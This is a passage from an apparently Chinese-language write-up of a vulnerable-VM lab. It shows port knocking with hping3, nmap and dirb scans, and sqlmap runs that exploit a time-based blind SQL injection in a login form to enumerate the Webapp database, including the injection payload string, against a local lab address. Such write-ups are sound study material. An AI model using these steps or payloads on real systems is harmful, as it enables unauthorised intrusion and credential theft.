class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ssh 192.168.159.135</span><br><span class="line">The authenticity of host &#x27;192.168.159.135 (192.168.159.135)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:Rz24fg01xp2jMdwk9c44ijnZAz1uaUlvRXX7QU+ERtI.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.159.135&#x27; (ED25519) to the list of known hosts.</span><br><span class="line"></span><br><span class="line">                                                  .____    _____________________________</span><br><span class="line">                                                  |    |   \_____  \__    ___/\______   \</span><br><span class="line">                                                  |    |    /   |   \|    |    |       _/</span><br><span class="line">                                                  |    |___/    |    \    |    |    |   \</span><br><span class="line">                                                  |_______ \_______  /____|    |____|_  /</span><br><span class="line">                                                          \/       \/                 \/</span><br><span class="line"> ____  __.                     __     ___________      .__                   .___ ___________      ___________       __</span><br><span class="line">|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________</span><br><span class="line">|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \</span><br><span class="line">|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/</span><br><span class="line">|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|</span><br><span class="line">        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/</span><br><span class="line">Easy as 1,2,3</span><br><span class="line">kali@192.168.159.135&#x27;s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">kali@192.168.159.135&#x27;s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">kali@192.168.159.135&#x27;s password: </span><br><span class="line">kali@192.168.159.135: Permission denied (publickey,password).</span><br><span class="line">                                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>这里说要easy as 1,2,3</p><p>看了一下wp，这里是个<a href="https://blog.csdn.net/moxuansheng/article/details/2478899">端口碰撞</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">                                                                             ┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hping3 -S 192.168.159.135 -c  1 -p 1  </span><br><span class="line">[open_sockraw] socket(): Operation not permitted</span><br><span class="line">[main] can&#x27;t open raw socket</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ hping3 -S 192.168.159.135 -c  1 -p 1</span><br><span class="line">[open_sockraw] socket(): Operation not permitted</span><br><span class="line">[main] can&#x27;t open raw socket</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 1</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 192.168.159.135 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 2</span><br><span class="line">HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 192.168.159.135 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo hping3 -S 192.168.159.135 -c  1 -p 3</span><br><span class="line">HPING 192.168.159.135 (eth0 192.168.159.135): S set, 40 headers + 0 data bytes</span><br><span class="line"></span><br><span class="line">--- 192.168.159.135 hping statistic ---</span><br><span class="line">1 packets transmitted, 0 packets received, 100% packet loss</span><br><span class="line">round-trip min/avg/max = 0.0/0.0/0.0 ms</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>刚开始怎么弄都不行</p><p>后来灵机一动是不是要root权限</p><p>结果还真成了</p><p><del>这个故事告诉我们，别瞎搜，搜出来的都是叫重装的</del></p><p>再扫一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -A -p- 192.168.159.135      </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 18:35 CST</span><br><span class="line">Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan</span><br><span class="line">NSE Timing: About 0.00% done</span><br><span class="line">Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 66.89% done; ETC: 18:37 (0:00:38 remaining)</span><br><span class="line">Nmap scan report for 192.168.159.135</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)</span><br><span class="line">|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)</span><br><span class="line">|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)</span><br><span class="line">|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)</span><br><span class="line">1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">MAC Address: 00:0C:29:65:E0:CF (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Linux 3.2 - 4.9 (93%), Linux 4.4 (93%), Linux 3.13 (90%), Linux 3.18 (89%), Linux 4.2 (87%), Linux 3.13 - 3.16 (87%), Linux 3.16 (87%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.30 ms 192.168.159.135</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 125.05 seconds</span><br></pre></td></tr></table></figure><p>扫面出来一个1337端口，需要注意的是需要完成端口碰撞的机器才能访问这个，所以我们要在虚拟机中进行访问</p><p>是个小孩骑狗的图片，扫了一下后台发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ dirb http://192.168.159.135:1337            </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Jun 30 18:47:11 2024</span><br><span class="line">URL_BASE: http://192.168.159.135:1337/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.159.135:1337/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.159.135:1337/images/                                           </span><br><span class="line">+ http://192.168.159.135:1337/index.html (CODE:200|SIZE:64)                                  </span><br><span class="line">+ http://192.168.159.135:1337/server-status (CODE:403|SIZE:297)                              </span><br><span class="line">                                                                                             </span><br><span class="line">---- Entering directory: http://192.168.159.135:1337/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Jun 30 18:47:14 2024</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br></pre></td></tr></table></figure><p>存在<code>/usr/share/dirb/wordlists/common.txt</code><br>访问一下</p><p>是这么一个图片，没有东西，看一下源码好像存在base64</p><p>两次解码以后得到<code>/978345210/index.php</code></p><p>访问，发现是一个登录框，怀疑有sql注入或者xss这种，先上sqlmap试试</p><p>—forms 在目标URL上解析和测试表单</p><p>—dbs  爆库</p><p>—tables  爆表</p><p>—column  爆列</p><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/80628392">sqlmap语句大全</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.8.6.3#dev&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [(]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 18:53:12 /2024-06-30/</span><br><span class="line"></span><br><span class="line">[18:53:12] [INFO] testing connection to the target URL</span><br><span class="line">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=0ppebngpp01...d0jo0k3ga3&#x27;). Do you want to use those [Y/n] Y</span><br><span class="line">[18:53:13] [INFO] searching for forms</span><br><span class="line">[1/1] Form:</span><br><span class="line">POST http://192.168.159.135:1337/978345210/index.php</span><br><span class="line">POST data: username=&amp;password=&amp;submit=%20Login%20</span><br><span class="line">do you want to test this form? [Y/n/q] </span><br><span class="line">&gt; Y</span><br><span class="line">Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login </span><br><span class="line">do you want to fill blank fields with random values? [Y/n] Y</span><br><span class="line">it appears that provided value for POST parameter &#x27;submit&#x27; has boundaries. Do you want to inject inside? (&#x27; Login* &#x27;) [y/N] N</span><br><span class="line">[18:53:13] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[18:53:13] [INFO] using &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0653pm.csv&#x27; as the CSV results file in multiple targets mode</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=xUrz&#x27; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#x27;etoh&#x27;=&#x27;etoh&amp;password=QvOd&amp;submit= Login</span><br><span class="line">---</span><br><span class="line">do you want to exploit this SQL injection? [Y/n] Y</span><br><span class="line">[18:53:13] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.7</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[18:53:13] [INFO] fetching database names</span><br><span class="line">[18:53:13] [INFO] fetching number of databases</span><br><span class="line">[18:53:13] [INFO] resumed: 4</span><br><span class="line">[18:53:13] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">[18:53:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">[18:53:28] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">information_schema</span><br><span class="line">[18:54:23] [INFO] retrieved: Webapp</span><br><span class="line">[18:54:43] [INFO] retrieved: mysql</span><br><span class="line">[18:54:59] [INFO] retrieved: performance_schema</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] Webapp</span><br><span class="line"></span><br><span class="line">[18:55:55] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0653pm.csv&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 18:55:54 /2024-06-30/</span><br><span class="line"></span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp --tables</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.8.6.3#dev&#125;</span><br><span class="line">|_ -| . [,]     | .&#x27;| . |</span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 18:57:04 /2024-06-30/</span><br><span class="line"></span><br><span class="line">[18:57:04] [INFO] testing connection to the target URL</span><br><span class="line">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=mb384e2a6cu...015s6ft4k2&#x27;). Do you want to use those [Y/n] Y</span><br><span class="line">[18:57:04] [INFO] searching for forms</span><br><span class="line">[1/1] Form:</span><br><span class="line">POST http://192.168.159.135:1337/978345210/index.php</span><br><span class="line">POST data: username=&amp;password=&amp;submit=%20Login%20</span><br><span class="line">do you want to test this form? [Y/n/q] </span><br><span class="line">&gt; Y</span><br><span class="line">Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login </span><br><span class="line">do you want to fill blank fields with random values? [Y/n] Y</span><br><span class="line">it appears that provided value for POST parameter &#x27;submit&#x27; has boundaries. Do you want to inject inside? (&#x27; Login* &#x27;) [y/N] N</span><br><span class="line">[18:57:04] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[18:57:04] [INFO] using &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0657pm.csv&#x27; as the CSV results file in multiple targets mode</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=xUrz&#x27; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#x27;etoh&#x27;=&#x27;etoh&amp;password=QvOd&amp;submit= Login</span><br><span class="line">---</span><br><span class="line">do you want to exploit this SQL injection? [Y/n] Y</span><br><span class="line">[18:57:04] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.7</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[18:57:04] [INFO] fetching tables for database: &#x27;Webapp&#x27;</span><br><span class="line">[18:57:04] [INFO] fetching number of tables for database &#x27;Webapp&#x27;</span><br><span class="line">[18:57:04] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)</span><br><span class="line">[18:57:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">1</span><br><span class="line">[18:57:09] [INFO] retrieved: </span><br><span class="line">[18:57:19] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">Users</span><br><span class="line">Database: Webapp</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| Users |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">[18:57:32] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0657pm.csv&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 18:57:32 /2024-06-30/</span><br><span class="line"></span><br><span class="line">                                                                                              </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sqlmap -u http://192.168.159.135:1337/978345210/index.php -forms --batch -D Webapp -T User</span><br><span class="line">s --columns</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.8.6.3#dev&#125;</span><br><span class="line">|_ -| . [&quot;]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 18:58:42 /2024-06-30/</span><br><span class="line"></span><br><span class="line">[18:58:42] [INFO] testing connection to the target URL</span><br><span class="line">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=glencc0t31r...q0mgrpu8v1&#x27;). Do you want to use those [Y/n] Y</span><br><span class="line">[18:58:42] [INFO] searching for forms</span><br><span class="line">[1/1] Form:</span><br><span class="line">POST http://192.168.159.135:1337/978345210/index.php</span><br><span class="line">POST data: username=&amp;password=&amp;submit=%20Login%20</span><br><span class="line">do you want to test this form? [Y/n/q] </span><br><span class="line">&gt; Y</span><br><span class="line">Edit POST data [default: username=&amp;password=&amp;submit=%20Login%20] (Warning: blank fields detected): username=&amp;password=&amp;submit= Login </span><br><span class="line">do you want to fill blank fields with random values? [Y/n] Y</span><br><span class="line">it appears that provided value for POST parameter &#x27;submit&#x27; has boundaries. Do you want to inject inside? (&#x27; Login* &#x27;) [y/N] N</span><br><span class="line">[18:58:42] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[18:58:42] [INFO] using &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0658pm.csv&#x27; as the CSV results file in multiple targets mode</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=xUrz&#x27; AND (SELECT 4216 FROM (SELECT(SLEEP(5)))maRq) AND &#x27;etoh&#x27;=&#x27;etoh&amp;password=QvOd&amp;submit= Login</span><br><span class="line">---</span><br><span class="line">do you want to exploit this SQL injection? [Y/n] Y</span><br><span class="line">[18:58:42] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[18:58:42] [INFO] fetching columns for table &#x27;Users&#x27; in database &#x27;Webapp&#x27;</span><br><span class="line">[18:58:42] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)</span><br><span class="line">[18:58:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">[18:58:58] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">3</span><br><span class="line">[18:58:58] [INFO] retrieved: id</span><br><span class="line">[18:59:04] [INFO] retrieved: int(10)</span><br><span class="line">[18:59:28] [INFO] retrieved: username</span><br><span class="line">[18:59:50] [INFO] retrieved: varchar(255)</span><br><span class="line">[19:00:27] [INFO] retrieved: password</span><br><span class="line">[19:00:54] [INFO] retrieved: varchar(255)</span><br><span class="line">Database: Webapp</span><br><span class="line">Table: Users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| id       | int(10)      |</span><br><span class="line">| password | varchar(255) |</span><br><span class="line">| username | varchar(255) |</span><br><span class="line">+----------+--------------+</span><br><span class="line"></span><br><span class="line">[19:01:31] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &#x27;/home/kali/.local/share/sqlmap/output/results-06302024_0658pm.csv&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:01:31 /2024-06-30/</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>最后得到</p><p>database：Webapp</p><p>table：Users</p><p>columns：id，username，password</p><p>在根据得到的爆破账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 